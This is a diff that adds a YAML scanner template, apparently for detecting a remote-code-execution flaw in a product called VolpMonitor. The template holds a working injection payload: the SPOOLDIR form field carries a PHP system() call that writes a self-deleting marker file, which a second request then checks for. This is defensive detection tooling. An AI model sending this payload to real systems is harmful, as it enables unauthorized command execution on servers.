@@ -1,0 +1,27 @@
+name: volpmonitor-rce
+set:
+  r1: randomLowercase(4)
+  r2: randomLowercase(4)
+  phpcode: >
+    "<?php echo \\'" + r1 + "\\'; unlink(__FILE__); ?>"
+rules:
+  - method: POST
+    path: "/index.php"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
+      Content-Type: "application/x-www-form-urlencoded"
+    body: |
+      SPOOLDIR=test".system('echo \'{{phpcode}}\' > {{r2}}.php')."&recheck=annen
+    expression: |
+      response.status == 200
+  - method: GET
+    path: "/{{r2}}.php"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
+      Accept-Encoding: "gzip, deflate"
+    expression: |
+      response.body.bcontains(bytes(r1))
+detail:
+  author: White(https://github.com/WhiteHSBG)
+  links:
+    - https://mp.weixin.qq.com/s/jF7pMfT22ALUJBG7aaiuDw
